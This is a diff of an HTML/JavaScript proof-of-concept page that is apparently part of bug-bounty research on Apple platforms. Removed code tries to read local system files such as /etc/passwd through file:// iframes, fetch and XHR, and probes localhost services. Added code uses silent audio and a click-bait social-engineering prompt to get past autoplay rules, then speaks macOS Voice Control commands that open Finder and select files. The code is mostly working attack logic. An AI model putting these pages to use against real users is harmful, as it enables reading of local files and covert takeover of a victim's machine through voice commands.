@@ -3,91 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Origin File Access Tests - Apple Bug Bounty</title>
+    <title>Voice Control Auto-Execution Bypass Test</title>
     <style>
+        :root {
+            --primary: #6366f1;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark: #1f2937;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Monaco', 'Menlo', monospace;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
         }
+
         body {
-            background: #000;
-            color: #00ff00;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: white;
+            min-height: 100vh;
             padding: 20px;
             line-height: 1.6;
+            cursor: pointer; /* Encourage clicking */
         }
+
         .container {
-            max-width: 1200px;
+            max-width: 800px;
             margin: 0 auto;
         }
-        .test-section {
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 5px;
-            padding: 15px;
-            margin: 10px 0;
+
+        .security-warning {
+            background: rgba(239, 68, 68, 0.3);
+            border: 2px solid #ef4444;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
         }
-        .test-title {
-            color: #ff6b6b;
-            margin-bottom: 10px;
+
+        .test-interface {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .click-bait {
+            background: rgba(99, 102, 241, 0.3);
+            border: 2px dashed var(--primary);
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .click-bait:hover {
+            background: rgba(99, 102, 241, 0.5);
+            transform: scale(1.02);
+        }
+
+        .sequence-display {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .sequence-step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin: 12px 0;
+            padding: 12px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .sequence-step.active {
+            background: rgba(99, 102, 241, 0.3);
+            border-left: 4px solid var(--primary);
+        }
+
+        .sequence-step.completed {
+            background: rgba(16, 185, 129, 0.2);
+            border-left: 4px solid var(--success);
+        }
+
+        .step-number {
+            background: var(--primary);
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .step-command {
+            flex: 1;
             font-size: 1.1em;
+            font-weight: 500;
         }
-        .status {
-            background: #000;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 10px 0;
-            height: 500px;
+
+        .step-timing {
+            color: var(--warning);
+            font-size: 0.9em;
+        }
+
+        .status-log {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 0.9em;
+            height: 200px;
             overflow-y: auto;
             border: 1px solid #333;
         }
+
+        .voice-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 4px;
+            margin: 25px 0;
+            height: 60px;
+            align-items: center;
+        }
+
+        .voice-bar {
+            width: 6px;
+            height: 20px;
+            background: var(--primary);
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+
+        .speaking .voice-bar {
+            animation: voicePulse 0.6s ease-in-out infinite;
+        }
+
+        @keyframes voicePulse {
+            0%, 100% { transform: scaleY(1); opacity: 0.7; }
+            50% { transform: scaleY(2.5); opacity: 1; background: #8b5cf6; }
+        }
+
         .success { color: #00ff88; }
         .error { color: #ff4444; }
         .warning { color: #ffaa00; }
         .info { color: #66ccff; }
-        .critical { color: #ff4444; font-weight: bold; }
+
+        .controls {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            background: #4f46e5;
+            transform: translateY(-2px);
+        }
+
+        .btn:disabled {
+            background: #6b7280;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .instructions {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 25px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🌐 Web Origin File Access Tests - Bug Bounty</h1>
-        <p>Testing file system access from WEB ORIGIN (http/https)</p>
+        <header>
+            <h1>🎤 Voice Control Auto-Execution Bypass Test</h1>
+            <p>Testing autoplay policy bypass for 0-click voice commands</p>
+        </header>
 
-        <div class="test-section">
-            <div class="test-title">🎯 Critical - File Protocol from Web Origin</div>
-            <div id="criticalTests">Testing if web page can access file:// URLs...</div>
+        <div class="security-warning">
+            <h3>🔒 Security Research - Autoplay Policy Bypass</h3>
+            <p>Testing if we can bypass browser autoplay restrictions for voice commands</p>
         </div>
 
-        <div class="test-section">
-            <div class="test-title">📁 File System Access API</div>
-            <div id="fsTests">Testing modern File System APIs...</div>
+        <div class="test-interface">
+            <h2>🚀 Auto-Execution Sequence</h2>
+            <p>Trying multiple techniques to bypass autoplay policy...</p>
+
+            <div class="click-bait" onclick="triggerUserInteraction()">
+                <h3>🎯 Click Here to Start Voice Commands</h3>
+                <p>This simulates getting user interaction through social engineering</p>
+                <p><small>Or click anywhere on the page</small></p>
+            </div>
+
+            <div class="voice-indicator" id="voiceIndicator">
+                <div class="voice-bar" style="animation-delay: 0s"></div>
+                <div class="voice-bar" style="animation-delay: 0.1s"></div>
+                <div class="voice-bar" style="animation-delay: 0.2s"></div>
+                <div class="voice-bar" style="animation-delay: 0.3s"></div>
+                <div class="voice-bar" style="animation-delay: 0.4s"></div>
+                <div class="voice-bar" style="animation-delay: 0.5s"></div>
+            </div>
+
+            <div class="sequence-display">
+                <h3>Command Sequence:</h3>
+                <div class="sequence-step" id="step1">
+                    <div class="step-number">1</div>
+                    <div class="step-command">"Start listening"</div>
+                    <div class="step-timing">Immediately</div>
+                </div>
+                <div class="sequence-step" id="step2">
+                    <div class="step-number">2</div>
+                    <div class="step-command">"Open Finder"</div>
+                    <div class="step-timing">+2 seconds</div>
+                </div>
+                <div class="sequence-step" id="step3">
+                    <div class="step-number">3</div>
+                    <div class="step-command">"Click documents"</div>
+                    <div class="step-timing">+2 seconds</div>
+                </div>
+                <div class="sequence-step" id="step4">
+                    <div class="step-number">4</div>
+                    <div class="step-command">"Move down"</div>
+                    <div class="step-timing">+2 seconds</div>
+                </div>
+                <div class="sequence-step" id="step5">
+                    <div class="step-number">5</div>
+                    <div class="step-command">"Select all"</div>
+                    <div class="step-timing">+2 seconds</div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button class="btn" onclick="startSequence()" id="startBtn">
+                    ▶️ Start Sequence
+                </button>
+                <button class="btn" onclick="stopSequence()" id="stopBtn" disabled>
+                    ⏹️ Stop Sequence
+                </button>
+                <button class="btn" onclick="resetSequence()">
+                    🔄 Reset
+                </button>
+            </div>
+
+            <div class="status-log" id="statusLog">
+                Status: Testing autoplay bypass techniques...
+            </div>
         </div>
 
-        <div class="test-section">
-            <div class="test-title">🔍 File Detection via Errors</div>
-            <div id="detectionTests">Testing file existence detection...</div>
-        </div>
-
-        <div class="test-section">
-            <div class="test-title">📡 Network & Localhost Access</div>
-            <div id="networkTests">Testing local network access...</div>
-        </div>
-
-        <div class="test-section">
-            <div class="test-title">⚡ Safari-Specific Vulnerabilities</div>
-            <div id="safariTests">Testing Safari-specific bypasses...</div>
-        </div>
-
-        <div class="status" id="statusLog">
-            Web Origin File Access Test Log - Starting...
+        <div class="instructions">
+            <h3>📋 Autoplay Bypass Techniques Being Tested:</h3>
+            <ol>
+                <li>Silent audio context creation</li>
+                <li>Video element with muted autoplay</li>
+                <li>Social engineering for user interaction</li>
+                <li>Multiple event listener attempts</li>
+                <li>Delayed audio context activation</li>
+            </ol>
         </div>
     </div>
 
+    <!-- Hidden video element for autoplay testing -->
+    <video id="hiddenVideo" muted playsinline style="display: none;"></video>
+
     <script>
-        let logElement = document.getElementById('statusLog');
+        let speechSynthesis = window.speechSynthesis;
+        let isSequenceRunning = false;
+        let currentStep = 0;
+        let sequenceTimeout = null;
+        let userInteracted = false;
+        let audioContext = null;
+
+        const commandSequence = [
+            { command: "Start listening", delay: 2000, stepId: "step1" },
+            { command: "Open Finder", delay: 2000, stepId: "step2" },
+            { command: "Click documents", delay: 2000, stepId: "step3" },
+            { command: "Move down", delay: 2000, stepId: "step4" },
+            { command: "Select all", delay: 2000, stepId: "step5" }
+        ];
 
         function log(message, type = 'info') {
+            const logElement = document.getElementById('statusLog');
             const entry = document.createElement('div');
             entry.className = type;
             entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
@@ -95,304 +318,236 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // Test 1: Critical - Can we access file:// from web origin?
-        async function testFileProtocolFromWebOrigin() {
-            log('CRITICAL TEST: Attempting file:// access from web origin...', 'critical');
-            const results = document.getElementById('criticalTests');
+        function updateStepVisual(stepIndex, state) {
+            commandSequence.forEach((_, index) => {
+                const step = document.getElementById(`step${index + 1}`);
+                if (step) {
+                    step.classList.remove('active', 'completed');
+                }
+            });
 
-            const testPaths = [
-                '/etc/hosts',
-                '/Users/',
-                '/System/',
-                '/private/etc/passwd'
-            ];
-
-            let anySuccess = false;
-
-            for (const path of testPaths) {
-                try {
-                    // Method 1: iframe with file://
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = `file://${path}`;
-                    
-                    iframe.onload = function() {
-                        log(`🚨 CRITICAL: IFRAME LOADED file://${path} FROM WEB ORIGIN!`, 'critical');
-                        results.innerHTML += `<div class="critical">🚨 IFRAME: file://${path} - VULNERABLE!</div>`;
-                        anySuccess = true;
-                    };
-                    
-                    iframe.onerror = function() {
-                        log(`✅ IFRAME BLOCKED: file://${path}`, 'success');
-                    };
-                    
-                    document.body.appendChild(iframe);
-                    setTimeout(() => {
-                        if (document.body.contains(iframe)) {
-                            document.body.removeChild(iframe);
-                        }
-                    }, 2000);
-
-                    // Method 2: Fetch file://
-                    try {
-                        const response = await fetch(`file://${path}`);
-                        if (response.ok) {
-                            const content = await response.text();
-                            log(`🚨 CRITICAL: FETCH SUCCESS file://${path} - Content: ${content.substring(0, 100)}`, 'critical');
-                            results.innerHTML += `<div class="critical">🚨 FETCH: file://${path} - VULNERABLE!</div>`;
-                            anySuccess = true;
-                        }
-                    } catch (e) {
-                        // Expected to fail
+            for (let i = 0; i <= stepIndex; i++) {
+                const step = document.getElementById(`step${i + 1}`);
+                if (step) {
+                    if (i === stepIndex && state === 'active') {
+                        step.classList.add('active');
+                    } else if (i <= stepIndex) {
+                        step.classList.add('completed');
                     }
-
-                    // Method 3: XHR file://
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', `file://${path}`, false);
-                        xhr.onreadystatechange = function() {
-                            if (xhr.readyState === 4 && xhr.status === 200) {
-                                log(`🚨 CRITICAL: XHR SUCCESS file://${path}`, 'critical');
-                                results.innerHTML += `<div class="critical">🚨 XHR: file://${path} - VULNERABLE!</div>`;
-                                anySuccess = true;
-                            }
-                        };
-                        xhr.send();
-                    } catch (e) {
-                        // Expected to fail
-                    }
-
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                } catch (error) {
-                    log(`Error testing ${path}: ${error.message}`, 'error');
                 }
-            }
-
-            if (!anySuccess) {
-                results.innerHTML += '<div class="success">✅ All file:// access blocked from web origin</div>';
             }
         }
 
-        // Test 2: File System Access API
-        async function testFileSystemAPI() {
-            log('Testing File System Access API...', 'info');
-            const results = document.getElementById('fsTests');
+        // Technique 1: Try to create audio context immediately
+        function tryAudioContextBypass() {
+            try {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                // Create a silent oscillator to unlock audio
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                gainNode.gain.value = 0; // Silent
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                oscillator.start();
+                setTimeout(() => oscillator.stop(), 100);
+                log('✅ Audio context created (silent)', 'success');
+                return true;
+            } catch (e) {
+                log(`❌ Audio context failed: ${e.message}`, 'error');
+                return false;
+            }
+        }
 
-            // Modern File System Access API
-            if ('showOpenFilePicker' in window) {
-                log('⚠️ showOpenFilePicker API available', 'warning');
+        // Technique 2: Try video autoplay
+        function tryVideoAutoplay() {
+            try {
+                const video = document.getElementById('hiddenVideo');
+                video.src = 'data:video/webm;base64,GkXfo0AgQoaBAUL3gQFC8oEEQvOBCEKCQAR3ZWJtQoeBAkKFgQIYU4BnQI0VSalmQCgq17FAAw9CQE2AQAZ3aGFtbXlXQUAGd2hhbW15RIlACECPQAAAAAAAFlSua0AxrkAu14EBY8WBAZyBACK1nEADdW5khkAFVl9WUDglhohAA1ZQOIOBAeBABrCBCLqBCB9DtnVAIueBAKNAH0NWUDg4gQETg4EBI4OCBCLqBCB/';
+                video.play().then(() => {
+                    log('✅ Video autoplay successful', 'success');
+                }).catch(e => {
+                    log(`❌ Video autoplay blocked: ${e.message}`, 'error');
+                });
+            } catch (e) {
+                log(`❌ Video autoplay error: ${e.message}`, 'error');
+            }
+        }
+
+        function speakCommand(command, stepIndex) {
+            return new Promise((resolve) => {
+                if (!speechSynthesis) {
+                    log('❌ Speech synthesis not supported', 'error');
+                    resolve();
+                    return;
+                }
+
+                if (speechSynthesis.speaking) {
+                    speechSynthesis.cancel();
+                }
+
+                log(`🎤 Attempting to speak: "${command}"`, 'info');
+                updateStepVisual(stepIndex, 'active');
+
+                const indicator = document.getElementById('voiceIndicator');
+                indicator.classList.add('speaking');
+
+                const utterance = new SpeechSynthesisUtterance(command);
                 
-                try {
-                    // This should require user gesture, but let's try anyway
-                    const handles = await window.showOpenFilePicker();
-                    log('🚨 CRITICAL: showOpenFilePicker worked without user gesture!', 'critical');
-                    results.innerHTML += '<div class="critical">🚨 showOpenFilePicker - VULNERABLE!</div>';
-                } catch (e) {
-                    log(`✅ showOpenFilePicker blocked: ${e.message}`, 'success');
-                    results.innerHTML += '<div class="success">✅ showOpenFilePicker requires user interaction</div>';
+                utterance.rate = 0.85;
+                utterance.pitch = 1.0;
+                utterance.volume = 1.0;
+                utterance.lang = 'en-US';
+
+                const voices = speechSynthesis.getVoices();
+                const commandVoice = voices.find(voice => 
+                    voice.name.includes('Alex') || 
+                    voice.name.includes('Samantha') ||
+                    voice.name.includes('Victoria') ||
+                    voice.lang === 'en-US'
+                );
+
+                if (commandVoice) {
+                    utterance.voice = commandVoice;
                 }
-            }
 
-            // Legacy webkitRequestFileSystem
-            if ('webkitRequestFileSystem' in window) {
-                log('Testing webkitRequestFileSystem...', 'info');
-                
-                try {
-                    window.webkitRequestFileSystem(window.TEMPORARY, 1024, function(fs) {
-                        log('✅ webkitRequestFileSystem sandbox access', 'success');
-                        results.innerHTML += '<div class="success">✅ webkitRequestFileSystem sandboxed</div>';
-                    }, function(e) {
-                        log(`✅ webkitRequestFileSystem blocked: ${e.message}`, 'success');
-                    });
-                } catch (e) {
-                    log(`✅ webkitRequestFileSystem error: ${e.message}`, 'success');
-                }
-            }
-        }
-
-        // Test 3: File Existence Detection via Error Messages
-        async function testFileExistenceDetection() {
-            log('Testing file existence detection through error messages...', 'info');
-            const results = document.getElementById('detectionTests');
-
-            const testFiles = [
-                'file:///etc/passwd',
-                'file:///Users/Shared/test.txt',
-                'file:///System/Library/CoreServices/SystemVersion.plist'
-            ];
-
-            for (const file of testFiles) {
-                try {
-                    // Try to load as image to detect existence
-                    await new Promise((resolve) => {
-                        const img = new Image();
-                        img.onload = function() {
-                            log(`🚨 CRITICAL: File detected via image load: ${file}`, 'critical');
-                            results.innerHTML += `<div class="critical">🚨 Image detection: ${file}</div>`;
-                            resolve();
-                        };
-                        img.onerror = function() {
-                            // Different error messages might reveal file existence
-                            resolve();
-                        };
-                        img.src = file;
-                    });
-
-                    // Try to load as script
-                    const script = document.createElement('script');
-                    script.src = file;
-                    script.onerror = function(e) {
-                        // Error message analysis might reveal file info
-                    };
-                    document.head.appendChild(script);
-                    setTimeout(() => document.head.removeChild(script), 1000);
-
-                } catch (e) {
-                    // Continue testing
-                }
-            }
-
-            results.innerHTML += '<div class="info">ℹ️ File detection attempts completed</div>';
-        }
-
-        // Test 4: Local Network & Service Access
-        async function testLocalNetworkAccess() {
-            log('Testing local network and service access...', 'info');
-            const results = document.getElementById('networkTests');
-
-            const localServices = [
-                'http://localhost/',
-                'http://127.0.0.1/',
-                'http://localhost:631/', // CUPS
-                'http://localhost:548/', // AFP
-                'http://localhost:5900/', // VNC
-                'http://localhost:8080/',
-                'file://localhost/',
-                'http://[::1]/'
-            ];
-
-            for (const service of localServices) {
-                try {
-                    const response = await fetch(service, { 
-                        method: 'HEAD',
-                        mode: 'no-cors'
-                    });
-                    log(`⚠️ Local service responded: ${service}`, 'warning');
-                    results.innerHTML += `<div class="warning">⚠️ Local service: ${service}</div>`;
-                } catch (e) {
-                    // Expected to fail in most cases
-                }
-            }
-
-            // Test iframe loading local services
-            localServices.forEach(service => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = service;
-                iframe.onload = function() {
-                    log(`🚨 CRITICAL: Local service loaded via iframe: ${service}`, 'critical');
-                    results.innerHTML += `<div class="critical">🚨 Local iframe: ${service}</div>`;
+                utterance.onstart = function() {
+                    log(`🔊 SUCCESS: Speaking command: "${command}"`, 'success');
                 };
-                document.body.appendChild(iframe);
-                setTimeout(() => {
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
-                    }
-                }, 3000);
+
+                utterance.onend = function() {
+                    indicator.classList.remove('speaking');
+                    log(`✅ Command completed: "${command}"`, 'success');
+                    updateStepVisual(stepIndex, 'completed');
+                    resolve();
+                };
+
+                utterance.onerror = function(event) {
+                    indicator.classList.remove('speaking');
+                    log(`❌ Speech error: ${event.error}`, 'error');
+                    updateStepVisual(stepIndex, 'completed');
+                    resolve();
+                };
+
+                // Try to speak - this might be blocked by autoplay policy
+                try {
+                    speechSynthesis.speak(utterance);
+                } catch (e) {
+                    log(`❌ Speech synthesis blocked: ${e.message}`, 'error');
+                    resolve();
+                }
             });
         }
 
-        // Test 5: Safari-Specific Bypasses
-        function testSafariSpecificBypasses() {
-            log('Testing Safari-specific bypass methods...', 'info');
-            const results = document.getElementById('safariTests');
-
-            // Test WebKit specific features
-            if (window.webkit) {
-                log('✅ WebKit environment detected', 'info');
-                
-                // Test for any WebKit-specific file access methods
-                if (webkit.messageHandlers) {
-                    log('⚠️ WebKit message handlers available', 'warning');
-                    
-                    // Try to find any file-related message handlers
-                    const handlers = Object.keys(webkit.messageHandlers);
-                    handlers.forEach(handler => {
-                        log(`ℹ️ Message handler: ${handler}`, 'info');
-                    });
+        async function executeSequenceStep(stepIndex) {
+            if (stepIndex >= commandSequence.length || !isSequenceRunning) {
+                if (isSequenceRunning) {
+                    log('🎉 Sequence completed!', 'success');
+                    isSequenceRunning = false;
+                    document.getElementById('stopBtn').disabled = true;
+                    document.getElementById('startBtn').disabled = false;
                 }
+                return;
             }
 
-            // Test for legacy Safari APIs that might bypass security
-            if (window.openDatabase) {
-                log('⚠️ WebSQL available (legacy)', 'warning');
-                // WebSQL might have different security rules
+            const step = commandSequence[stepIndex];
+            currentStep = stepIndex;
+
+            await speakCommand(step.command, stepIndex);
+
+            if (isSequenceRunning) {
+                sequenceTimeout = setTimeout(() => {
+                    executeSequenceStep(stepIndex + 1);
+                }, step.delay);
             }
-
-            // Test for any unusual URI schemes Safari might handle
-            const unusualSchemes = [
-                'x-file:///',
-                'safari-file://',
-                'webkit-file://',
-                'localstorage://',
-                'safari-extension://'
-            ];
-
-            unusualSchemes.forEach(scheme => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = scheme + 'etc/hosts';
-                iframe.onload = function() {
-                    log(`🚨 CRITICAL: Unusual scheme loaded: ${scheme}`, 'critical');
-                    results.innerHTML += `<div class="critical">🚨 Scheme: ${scheme}</div>`;
-                };
-                document.body.appendChild(iframe);
-                setTimeout(() => {
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
-                    }
-                }, 2000);
-            });
-
-            results.innerHTML += '<div class="info">ℹ️ Safari-specific tests completed</div>';
         }
 
-        // Auto-execute all tests when hosted on web server
-        window.addEventListener('load', () => {
-            log('🌐 WEB ORIGIN TESTS STARTING - Hosted from: ' + window.location.origin, 'critical');
+        function startSequence() {
+            if (isSequenceRunning) return;
+
+            if (!speechSynthesis) {
+                log('❌ Speech synthesis not available', 'error');
+                return;
+            }
+
+            isSequenceRunning = true;
+            currentStep = 0;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('startBtn').disabled = true;
+
+            log('🚀 Starting voice command sequence...', 'info');
             
-            // Only run if we're on a web origin (not file://)
-            if (window.location.protocol === 'http:' || window.location.protocol === 'https:') {
-                log('✅ Testing from web origin - this is what matters for bug bounty!', 'success');
-                
-                setTimeout(testFileProtocolFromWebOrigin, 1000);
-                setTimeout(testFileSystemAPI, 3000);
-                setTimeout(testFileExistenceDetection, 5000);
-                setTimeout(testLocalNetworkAccess, 7000);
-                setTimeout(testSafariSpecificBypasses, 9000);
-            } else {
-                log('❌ This test must be hosted on a web server (http/https) for valid bug bounty testing', 'error');
+            commandSequence.forEach((_, index) => {
+                const step = document.getElementById(`step${index + 1}`);
+                if (step) step.classList.remove('active', 'completed');
+            });
+
+            executeSequenceStep(0);
+        }
+
+        function triggerUserInteraction() {
+            if (!userInteracted) {
+                userInteracted = true;
+                log('✅ User interaction detected - audio should work now!', 'success');
+                // Try to start sequence automatically after interaction
+                setTimeout(startSequence, 500);
             }
+        }
+
+        function stopSequence() {
+            if (isSequenceRunning) {
+                isSequenceRunning = false;
+                if (sequenceTimeout) clearTimeout(sequenceTimeout);
+                if (speechSynthesis.speaking) speechSynthesis.cancel();
+                document.getElementById('voiceIndicator').classList.remove('speaking');
+                log('⏹️ Sequence stopped', 'warning');
+                document.getElementById('stopBtn').disabled = true;
+                document.getElementById('startBtn').disabled = false;
+                
+                if (currentStep >= 0) {
+                    updateStepVisual(currentStep, 'completed');
+                }
+            }
+        }
+
+        function resetSequence() {
+            stopSequence();
+            currentStep = 0;
+            commandSequence.forEach((_, index) => {
+                const step = document.getElementById(`step${index + 1}`);
+                if (step) step.classList.remove('active', 'completed');
+            });
+            log('🔄 Sequence reset', 'info');
+            document.getElementById('startBtn').disabled = false;
+        }
+
+        // Initialize and try bypass techniques
+        document.addEventListener('DOMContentLoaded', function() {
+            log('🔧 Testing autoplay bypass techniques...', 'info');
+
+            // Try various bypass methods
+            setTimeout(tryAudioContextBypass, 100);
+            setTimeout(tryVideoAutoplay, 300);
+
+            // Set up user interaction listeners
+            document.addEventListener('click', triggerUserInteraction);
+            document.addEventListener('keydown', triggerUserInteraction);
+            document.addEventListener('scroll', triggerUserInteraction);
+
+            // Try to auto-start after a delay (might not work due to autoplay)
+            setTimeout(() => {
+                if (!userInteracted) {
+                    log('⚠️ Autoplay policy is blocking audio - click anywhere to start', 'warning');
+                    // Try to start anyway (will likely fail but good for testing)
+                    startSequence();
+                }
+            }, 2000);
         });
 
-        // Additional vulnerability tests
-        setTimeout(() => {
-            // Test for any postMessage vulnerabilities
-            window.postMessage('file:///etc/hosts', '*');
-            
-            // Test for any edge cases in error handling
-            try {
-                // This might reveal information in error messages
-                const x = null;
-                x.nonExistentMethod();
-            } catch (e) {
-                // Check if error reveals system information
-                if (e.stack && e.stack.includes('file://')) {
-                    log('🚨 CRITICAL: Error stack reveals file:// paths!', 'critical');
-                }
-            }
-        }, 11000);
-
+        // Load voices
+        speechSynthesis.onvoiceschanged = function() {
+            const voices = speechSynthesis.getVoices();
+            log(`✅ ${voices.length} voices available`, 'success');
+        };
     </script>
 </body>
 </html>
